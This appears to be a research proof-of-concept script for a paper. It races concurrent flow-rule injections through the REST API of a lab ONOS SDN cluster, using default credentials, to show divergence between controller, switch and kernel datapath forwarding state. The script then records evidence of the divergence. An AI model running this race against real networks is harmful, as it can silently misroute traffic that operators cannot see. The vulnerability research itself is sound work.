#!/usr/bin/env python3

from __future__ import annotations

import argparse
import json
import os
import subprocess
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# ============================================================
# CONFIGURATION
# ============================================================
ONOS_NODES = {
    "onos-1": "172.18.0.11",
    "onos-2": "172.18.0.12",
    "onos-3": "172.18.0.13",
}
ONOS_PORT = 8181
SWITCH_ID = "of:0000000000000001"
SWITCH_NAME = "s1"
TARGET_IP = "10.0.0.99"
FLOW_PRIORITY = 50000
OVS_POLL_INTERVAL = 0.02
TRACE_IN_PORT = "3"

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
EVIDENCE_DIR = os.path.join(SCRIPT_DIR, "evidence")


# ============================================================
# ONOS REST HELPERS
# ============================================================
def onos_get(node_ip, path):
    url = f"http://{node_ip}:{ONOS_PORT}/onos/v1/{path}"
    try:
        r = subprocess.run(
            ["curl", "-s", "-u", "onos:rocks", url],
            capture_output=True, text=True, timeout=10
        )
        return json.loads(r.stdout) if r.stdout.strip() else {}
    except Exception as e:
        return {"error": str(e)}


def onos_post_with_status(node_ip, path, body):
    url = f"http://{node_ip}:{ONOS_PORT}/onos/v1/{path}"
    try:
        r = subprocess.run(
            ["curl", "-s", "-u", "onos:rocks",
             "-X", "POST",
             "-H", "Content-Type: application/json",
             "-d", json.dumps(body),
             "-w", "\n%{http_code}",
             url],
            capture_output=True, text=True, timeout=10
        )
        lines = r.stdout.strip().rsplit("\n", 1)
        if len(lines) == 2:
            body_str, code_str = lines
        else:
            body_str = ""
            code_str = lines[0] if lines else "0"
        try:
            status_code = int(code_str)
        except ValueError:
            status_code = 0
        try:
            json_body = json.loads(body_str) if body_str.strip() else {}
        except json.JSONDecodeError:
            json_body = {}
        return json_body, status_code
    except Exception as e:
        return {"error": str(e)}, 0


def onos_delete(node_ip, path):
    url = f"http://{node_ip}:{ONOS_PORT}/onos/v1/{path}"
    try:
        subprocess.run(
            ["curl", "-s", "-u", "onos:rocks", "-X", "DELETE", url],
            capture_output=True, text=True, timeout=10
        )
    except Exception:
        pass


# ============================================================
# OVS HELPERS
# ============================================================
def get_switch_action():
    try:
        r = subprocess.run(
            ["ovs-ofctl", "-O", "OpenFlow13", "dump-flows", SWITCH_NAME],
            capture_output=True, text=True, timeout=2
        )
        for line in r.stdout.split("\n"):
            if TARGET_IP in line and "actions=output:" in line:
                return line.split("actions=output:")[-1].strip()
        return None
    except Exception:
        return None


def get_switch_dump_raw():
    try:
        r = subprocess.run(
            ["ovs-ofctl", "-O", "OpenFlow13", "dump-flows", SWITCH_NAME],
            capture_output=True, text=True, timeout=2
        )
        return r.stdout
    except Exception:
        return ""


def get_traffic_trace_raw():
    try:
        r = subprocess.run(
            ["ovs-appctl", "ofproto/trace", SWITCH_NAME,
             f"in_port={TRACE_IN_PORT},dl_type=0x0800,nw_dst={TARGET_IP}"],
            capture_output=True, text=True, timeout=5
        )
        return r.stdout
    except Exception:
        return ""


def parse_datapath_actions(trace_output):
    for line in trace_output.split("\n"):
        if "Datapath actions:" in line:
            actions = line.split("Datapath actions:")[-1].strip()
            if "drop" in actions:
                return "drop"
            if "output:" in actions:
                return actions.split("output:")[-1].strip().split(",")[0]
            first_token = actions.split(",")[0].strip()
            if first_token.isdigit():
                return first_token
    return "unknown"


def verify_traffic_impact():
    return parse_datapath_actions(get_traffic_trace_raw())


# ============================================================
# CLUSTER STATE
# ============================================================
def get_node_roles():
    roles = {}
    for name, ip in ONOS_NODES.items():
        resp = onos_get(ip, f"devices/{SWITCH_ID}")
        roles[name] = {"ip": ip, "role": resp.get("role", "NONE")}
    return roles


def get_non_master_nodes():
    roles = get_node_roles()
    master_ip = master_name = None
    non_master = []
    for name, info in roles.items():
        if info["role"] == "MASTER":
            master_ip = info["ip"]
            master_name = name
        else:
            non_master.append(info["ip"])
    if len(non_master) >= 2:
        return non_master[0], non_master[1], master_ip, master_name
    if len(non_master) == 1 and master_ip:
        return non_master[0], master_ip, master_ip, master_name
    ips = list(ONOS_NODES.values())
    return ips[1], ips[2], ips[0], "onos-1"


def get_mastership():
    for name, info in get_node_roles().items():
        if info["role"] == "MASTER":
            return f"{name} ({info['ip']})"
    return "unknown"


def get_onos_stored_port(node_ip):
    try:
        resp = onos_get(node_ip, f"flows/{SWITCH_ID}")
        for f in resp.get("flows", []):
            if f.get("priority") != FLOW_PRIORITY:
                continue
            for c in f.get("selector", {}).get("criteria", []):
                if c.get("type") == "IPV4_DST" and TARGET_IP in c.get("ip", ""):
                    return f["treatment"]["instructions"][0]["port"]
        return None
    except Exception:
        return None


def get_onos_flow_json(node_ip):
    try:
        resp = onos_get(node_ip, f"flows/{SWITCH_ID}")
        for f in resp.get("flows", []):
            if f.get("priority") != FLOW_PRIORITY:
                continue
            for c in f.get("selector", {}).get("criteria", []):
                if c.get("type") == "IPV4_DST" and TARGET_IP in c.get("ip", ""):
                    return f
        return None
    except Exception:
        return None


# ============================================================
# CLEANUP
# ============================================================
def verify_clean_state():
    if get_switch_action() is not None:
        return False
    for ip in ONOS_NODES.values():
        if get_onos_stored_port(ip) is not None:
            return False
    return True


def delete_target_flows():
    for ip in ONOS_NODES.values():
        resp = onos_get(ip, f"flows/{SWITCH_ID}")
        for f in resp.get("flows", []):
            if f.get("priority") == FLOW_PRIORITY:
                onos_delete(ip, f"flows/{SWITCH_ID}/{f['id']}")
    for _ in range(40):
        if verify_clean_state():
            return True
        time.sleep(0.25)
    subprocess.run(
        ["ovs-ofctl", "-O", "OpenFlow13", "del-flows", SWITCH_NAME,
         f"ip,nw_dst={TARGET_IP}"],
        capture_output=True, timeout=5
    )
    time.sleep(1)
    for _ in range(20):
        if verify_clean_state():
            return True
        time.sleep(0.25)
    return verify_clean_state()


# ============================================================
# INJECTION
# ============================================================
def build_flow_body(output_port):
    return {
        "flows": [{
            "deviceId": SWITCH_ID,
            "priority": FLOW_PRIORITY,
            "timeout": 0,
            "isPermanent": True,
            "treatment": {
                "instructions": [{"type": "OUTPUT", "port": str(output_port)}]
            },
            "selector": {
                "criteria": [
                    {"type": "ETH_TYPE", "ethType": "0x800"},
                    {"type": "IPV4_DST", "ip": f"{TARGET_IP}/32"}
                ]
            }
        }]
    }


def inject_flow(node_ip, output_port):
    body = build_flow_body(output_port)
    t_send = time.time()
    result, http_status = onos_post_with_status(node_ip, "flows", body)
    t_done = time.time()
    return {
        "node": node_ip, "port": output_port,
        "t_send": t_send, "t_done": t_done,
        "latency_ms": (t_done - t_send) * 1000,
        "http_status": http_status, "result": result,
    }


# ============================================================
# EVIDENCE CAPTURE
# ============================================================
_LIFETIME_LABELS = {
    "HEALED":          "TRANSIENT (both OF and DP healed by t+30s)",
    "DIVERGENT_BOTH":  "PERSISTENT (OF and DP both still divergent at t+30s)",
    "DIVERGENT_DP":    "PERSISTENT at DP level (OF healed, kernel datapath stale)",
    "DIVERGENT_OF":    "DIVERGENT at OF level (rare)",
    None:              "UNKNOWN (t+30s state unparseable)",
}

_VERDICT_LINES = {
    "HEALED": [
        "  TRANSIENT cross-plane divergence.",
        "  Observable for at least 3s on at least one layer (OF or DP),",
        "  but BOTH layers are reconciled within 30s. The 3s window is",
        "  sufficient for an attacker to act on the inconsistency.",
    ],
    "DIVERGENT_BOTH": [
        "  PERSISTENT cross-plane divergence (>= 30s) on BOTH layers.",
        "  ONOS state and ovs-ofctl/datapath all disagree with the cluster.",
        "  The bug does not self-heal within the observation window.",
    ],
    "DIVERGENT_DP": [
        "  PERSISTENT divergence at the KERNEL DATAPATH level.",
        "  At t+30s, ONOS REST and ovs-ofctl dump-flows agree (OF-level",
        "  reconciliation effective), BUT ofproto/trace shows the kernel",
        "  datapath still applies the stale action (megaflow cache not",
        "  invalidated). An operator monitoring ONOS or OVS user-space",
        "  sees a consistent state, while real packets are forwarded to",
        "  the wrong port — a concealed forwarding inconsistency.",
    ],
    "DIVERGENT_OF": [
        "  DIVERGENCE at OF level (kernel datapath happens to be correct).",
        "  Unusual configuration; see raw dumps.",
    ],
    None: ["  UNKNOWN lifetime — see raw dumps."],
}


def capture_evidence(test_id, result_a, result_b, r):
    """r is the dict returned by run_single_test for a divergent iteration."""
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    capture_dir = os.path.join(EVIDENCE_DIR, f"divergence_{ts}")
    os.makedirs(capture_dir, exist_ok=True)

    # Per-node ONOS flow JSON at capture time
    for name, ip in ONOS_NODES.items():
        flow_json = get_onos_flow_json(ip)
        with open(os.path.join(capture_dir, f"{name}_flow.json"), "w") as f:
            json.dump(flow_json, f, indent=2)

    # OVS dump and ofproto/trace at capture time
    with open(os.path.join(capture_dir, "switch_dump.txt"), "w") as f:
        f.write(get_switch_dump_raw())
    with open(os.path.join(capture_dir, "trace.txt"), "w") as f:
        f.write(get_traffic_trace_raw())

    persist = r.get("persist_30s")
    lifetime_label = _LIFETIME_LABELS.get(persist, _LIFETIME_LABELS[None])
    verdict_lines = _VERDICT_LINES.get(persist, _VERDICT_LINES[None])

    onos_t3 = r["onos_ports_t3"]
    onos_t30 = r.get("onos_ports_t30", {})

    with open(os.path.join(capture_dir, "summary.txt"), "w") as f:
        f.write("=" * 65 + "\n")
        f.write(" MOTIVATING EXAMPLE — CROSS-PLANE DIVERGENCE\n")
        f.write(f" Captured: {datetime.now().isoformat()}\n")
        f.write(f" Test id:  #{test_id}\n")
        f.write(f" Lifetime: {lifetime_label}\n")
        f.write("=" * 65 + "\n\n")

        f.write("--- PRE-INJECTION SANITY CHECK ---\n")
        f.write(f"  Datapath cache flushed.\n")
        f.write(f"  DP-level pre-injection: OUTPUT:{r.get('dp_pre')}\n")
        f.write("  (expected: 'unknown' / 'drop' — no rule yet)\n\n")

        f.write("--- INJECTION ---\n")
        f.write(f"  A: HTTP {result_a['http_status']} ->"
                f" OUTPUT:{result_a['port']} on {result_a['node']}"
                f" ({result_a['latency_ms']:.1f} ms)\n")
        f.write(f"  B: HTTP {result_b['http_status']} ->"
                f" OUTPUT:{result_b['port']} on {result_b['node']}"
                f" ({result_b['latency_ms']:.1f} ms)\n\n")

        f.write("--- STATE AT t+3s (divergence observed) ---\n")
        for name in ONOS_NODES:
            f.write(f"  ONOS {name:6s}             : OUTPUT:{onos_t3.get(name)}\n")
        f.write(f"  Switch (ovs-ofctl)      : OUTPUT:{r.get('of_t3')}"
                f"   [{'consistent' if r.get('of_consistent_t3') else 'DIVERGENT'}]\n")
        f.write(f"  Datapath (ofproto/trace): OUTPUT:{r.get('dp_t3')}"
                f"   [{'consistent' if r.get('dp_consistent_t3') else 'DIVERGENT'}]\n\n")

        f.write("--- STATE AT t+30s (lifetime check) ---\n")
        for name in ONOS_NODES:
            f.write(f"  ONOS {name:6s}             : OUTPUT:{onos_t30.get(name)}\n")
        f.write(f"  Switch (ovs-ofctl)      : OUTPUT:{r.get('of_t30')}"
                f"   [{'consistent' if r.get('of_consistent_t30') else 'DIVERGENT'}]\n")
        f.write(f"  Datapath (ofproto/trace): OUTPUT:{r.get('dp_t30')}"
                f"   [{'consistent' if r.get('dp_consistent_t30') else 'DIVERGENT'}]\n\n")

        f.write("--- VERDICT ---\n")
        for line in verdict_lines:
            f.write(line + "\n")
        f.write("=" * 65 + "\n")

    return capture_dir


# ============================================================
# SINGLE-ITERATION TEST
# ============================================================
def flush_datapath_cache():
    """Explicitly invalidate the kernel datapath megaflow cache.

    Without this, a stale megaflow from a previous test can survive the
    OF-level cleanup and pollute the next test's t+3s measurement.
    """
    try:
        subprocess.run(
            ["ovs-appctl", "dpctl/del-flows"],
            capture_output=True, timeout=5,
        )
    except Exception:
        pass


def get_pre_injection_dp_state():
    """DP-level state before injection. Should be 'unknown'/'drop' on a
    cleanly flushed datapath with no matching OF rule for the target."""
    return verify_traffic_impact()


def run_single_test(attacker_a, attacker_b, port_a=1, port_b=2):
    if not delete_target_flows():
        return {"error": "cleanup_failed"}
    if not verify_clean_state():
        time.sleep(2)
        delete_target_flows()
        if not verify_clean_state():
            return {"error": "pre_test_dirty"}

    # Flush the kernel datapath megaflow cache so any stale entry from a
    # previous test cannot be misattributed to the current race.
    flush_datapath_cache()
    time.sleep(0.5)
    dp_pre = get_pre_injection_dp_state()

    # Background polling of switch state to capture transitions
    transitions = []
    monitoring = [True]
    current_action = [None]

    def monitor_switch():
        while monitoring[0]:
            action = get_switch_action()
            if action != current_action[0]:
                transitions.append({
                    "t": time.time(),
                    "from": current_action[0], "to": action,
                })
                current_action[0] = action
            time.sleep(OVS_POLL_INTERVAL)

    monitor_thread = threading.Thread(target=monitor_switch, daemon=True)
    monitor_thread.start()

    # Concurrent injection (two threads, two backups)
    with ThreadPoolExecutor(max_workers=2) as ex:
        f_a = ex.submit(inject_flow, attacker_a, port_a)
        f_b = ex.submit(inject_flow, attacker_b, port_b)
        result_a, result_b = f_a.result(), f_b.result()

    # Post-injection observation window: 3s
    time.sleep(3)
    monitoring[0] = False
    monitor_thread.join(timeout=2)

    # State at t+3s — measure BOTH layers
    of_t3 = get_switch_action()           # OF user-space (ovs-ofctl dump)
    dp_t3 = verify_traffic_impact()        # kernel datapath (ofproto/trace)
    onos_ports_t3 = {n: get_onos_stored_port(ip) for n, ip in ONOS_NODES.items()}
    onos_values = {str(v) for v in onos_ports_t3.values() if v is not None}
    onos_consensus = onos_values.pop() if len(onos_values) == 1 else None

    of_consistent_t3 = (onos_consensus is not None and of_t3 is not None
                        and str(of_t3) == onos_consensus)
    dp_consistent_t3 = (onos_consensus is not None and dp_t3 not in (None, "", "unknown", "error")
                        and str(dp_t3) == onos_consensus)
    state_consistent = of_consistent_t3 and dp_consistent_t3

    # Stop early if state at t+3s is already consistent on BOTH layers
    if state_consistent or onos_consensus is None:
        return {
            "error": None,
            "state_consistent_t3": state_consistent,
            "of_consistent_t3":    of_consistent_t3,
            "dp_consistent_t3":    dp_consistent_t3,
            "onos_ports_t3":       onos_ports_t3,
            "of_t3":               of_t3,
            "dp_t3":               dp_t3,
            "dp_pre":              dp_pre,
            "transitions":         len(transitions),
            "result_a": result_a, "result_b": result_b,
            "persist_30s":         None,
        }

    # State at t+30s — measure both layers again
    time.sleep(27)
    of_t30 = get_switch_action()
    dp_t30 = verify_traffic_impact()
    onos_ports_t30 = {n: get_onos_stored_port(ip)
                      for n, ip in ONOS_NODES.items()}
    onos_t30_values = {str(v) for v in onos_ports_t30.values() if v is not None}
    onos_t30_consensus = (onos_t30_values.pop()
                          if len(onos_t30_values) == 1 else None)

    of_consistent_t30 = (onos_t30_consensus is not None and of_t30 is not None
                         and str(of_t30) == onos_t30_consensus)
    dp_consistent_t30 = (onos_t30_consensus is not None
                         and dp_t30 not in (None, "", "unknown", "error")
                         and str(dp_t30) == onos_t30_consensus)

    # Two-layer lifetime classification
    if of_consistent_t30 and dp_consistent_t30:
        persist = "HEALED"           # fully reconciled on both layers
    elif not of_consistent_t30 and not dp_consistent_t30:
        persist = "DIVERGENT_BOTH"   # still divergent on both layers
    elif of_consistent_t30 and not dp_consistent_t30:
        persist = "DIVERGENT_DP"     # OF healed but kernel datapath stale
    else:
        persist = "DIVERGENT_OF"     # rare: OF still wrong but DP correct

    return {
        "error":               None,
        "state_consistent_t3": False,
        "of_consistent_t3":    of_consistent_t3,
        "dp_consistent_t3":    dp_consistent_t3,
        "onos_ports_t3":       onos_ports_t3,
        "of_t3":               of_t3,
        "dp_t3":               dp_t3,
        "dp_pre":              dp_pre,
        "transitions":         len(transitions),
        "onos_ports_t30":      onos_ports_t30,
        "of_t30":              of_t30,
        "dp_t30":              dp_t30,
        "of_consistent_t30":   of_consistent_t30,
        "dp_consistent_t30":   dp_consistent_t30,
        "result_a": result_a, "result_b": result_b,
        "persist_30s":         persist,
    }


# ============================================================
# MAIN
# ============================================================
def main():
    p = argparse.ArgumentParser(
        description="Motivating example: prove cross-plane divergence exists "
                    "and is exploitable. Stops on first persistent case.")
    p.add_argument("-i", "--max-iterations", type=int, default=200,
                   help="Upper bound on attempts (default: 200).")
    p.add_argument("-d", "--delay", type=float, default=1.0,
                   help="Seconds between iterations (default: 1.0).")
    p.add_argument("--no-prompt", action="store_true",
                   help="Skip the [PRÊT] confirmation.")
    args = p.parse_args()

    if os.geteuid() != 0:
        print("[ERROR] Must be run as root (sudo) — needs ovs-ofctl/ovs-appctl.")
        sys.exit(1)

    os.makedirs(EVIDENCE_DIR, exist_ok=True)

    print("=" * 70)
    print("  MOTIVATING EXAMPLE — Cross-plane divergence (qualitative)")
    print("=" * 70)
    print(f"  Max iterations: {args.max_iterations}")
    print(f"  Delay:          {args.delay}s")
    print(f"  Evidence dir:   {EVIDENCE_DIR}")
    print(f"  Stop on:        first iteration with persist_30s == DIVERGENT")
    print()

    # Cluster sanity check
    print("  [CHECK] Cluster status...")
    roles = get_node_roles()
    cluster_ok = True
    for name, info in roles.items():
        resp = onos_get(info["ip"], f"devices/{SWITCH_ID}")
        avail = resp.get("available", False)
        cluster_ok = cluster_ok and avail
        print(f"    {name} ({info['ip']}): {info['role']}"
              f" [{'OK' if avail else 'FAIL'}]")
    if not cluster_ok:
        print("\n  [ERROR] Cluster is not fully available.")
        sys.exit(1)

    node_a, node_b, master_ip, master_name = get_non_master_nodes()
    print(f"\n  Master:      {master_name} ({master_ip})")
    print(f"  Attacker A:  {node_a} (non-master)")
    print(f"  Attacker B:  {node_b} (non-master)")

    # Initial cleanup
    print("\n  [CLEAN] Initial cleanup...")
    delete_target_flows()
    time.sleep(2)
    if not verify_clean_state():
        delete_target_flows()
        time.sleep(3)
    print(f"  [CHECK] Clean state: {'YES' if verify_clean_state() else 'NO'}")

    if not args.no_prompt:
        input("\n  [READY] Press Enter to start...\n")

    # Main loop — stop on first divergence at t+3s (OF or DP layer)
    found = None
    for i in range(1, args.max_iterations + 1):
        ts = datetime.now().strftime("%H:%M:%S")
        r = run_single_test(node_a, node_b, port_a=1, port_b=2)

        if r.get("error"):
            print(f"  [{ts}] iter {i:3d}: ERROR ({r['error']})")
            time.sleep(args.delay)
            continue

        if r["state_consistent_t3"]:
            of_ok = "OF=ok" if r.get("of_consistent_t3") else "OF=DIVERGENT"
            dp_ok = "DP=ok" if r.get("dp_consistent_t3") else "DP=DIVERGENT"
            print(f"  [{ts}] iter {i:3d}: consistent at t+3s ({of_ok}, {dp_ok})")
            time.sleep(args.delay)
            continue

        # Divergence at t+3s on at least one layer — STOP.
        which = []
        if not r.get("of_consistent_t3"):
            which.append("OF")
        if not r.get("dp_consistent_t3"):
            which.append("DP")
        layer_str = "+".join(which)
        label = _LIFETIME_LABELS.get(r.get("persist_30s"), "?")
        print(f"  [{ts}] iter {i:3d}: \033[1;31mDIVERGENCE at t+3s "
              f"({layer_str})\033[0m → {label} — STOPPING")
        evidence = capture_evidence(i, r["result_a"], r["result_b"], r)
        found = (i, r, evidence)
        break

    # Final report
    print()
    print("=" * 70)
    if found is None:
        print(f"  NO persistent divergence found in {args.max_iterations}"
              f" iterations.")
        print("  Either the cluster reconciles too fast on this run,")
        print("  or the bug requires more attempts. Re-run or increase -i.")
        print("=" * 70)
        sys.exit(1)

    iter_num, result, evidence_dir = found
    persist = result.get("persist_30s")
    lifetime = _LIFETIME_LABELS.get(persist, _LIFETIME_LABELS[None])

    print(f"  VULNERABILITY DEMONSTRATED at iteration #{iter_num}")
    print(f"  Lifetime: {lifetime}")
    print("=" * 70)
    print("  STATE AT t+3s:")
    print(f"    ONOS:      " + ", ".join(
        f"{n}=OUTPUT:{result['onos_ports_t3'].get(n)}"
        for n in ONOS_NODES))
    print(f"    OF-level:  OUTPUT:{result.get('of_t3')}"
          f"  [{'consistent' if result.get('of_consistent_t3') else 'DIVERGENT'}]")
    print(f"    DP-level:  OUTPUT:{result.get('dp_t3')}"
          f"  [{'consistent' if result.get('dp_consistent_t3') else 'DIVERGENT'}]")
    if persist in ("HEALED", "DIVERGENT_BOTH", "DIVERGENT_DP", "DIVERGENT_OF"):
        print()
        print("  STATE AT t+30s:")
        print(f"    ONOS:      " + ", ".join(
            f"{n}=OUTPUT:{result.get('onos_ports_t30', {}).get(n)}"
            for n in ONOS_NODES))
        print(f"    OF-level:  OUTPUT:{result.get('of_t30')}"
              f"  [{'consistent' if result.get('of_consistent_t30') else 'DIVERGENT'}]")
        print(f"    DP-level:  OUTPUT:{result.get('dp_t30')}"
              f"  [{'consistent' if result.get('dp_consistent_t30') else 'DIVERGENT'}]")
    print()
    print(f"  Evidence: {evidence_dir}/")
    print(f"            ├── summary.txt        (human-readable)")
    print(f"            ├── switch_dump.txt    (ovs-ofctl dump)")
    print(f"            ├── trace.txt          (ovs-appctl ofproto/trace)")
    print(f"            └── onos-{{1,2,3}}_flow.json (per-node REST view)")
    print()
    print("  This is the case to cite in §3.2 of the paper.")
    print("=" * 70)


if __name__ == "__main__":
    main()
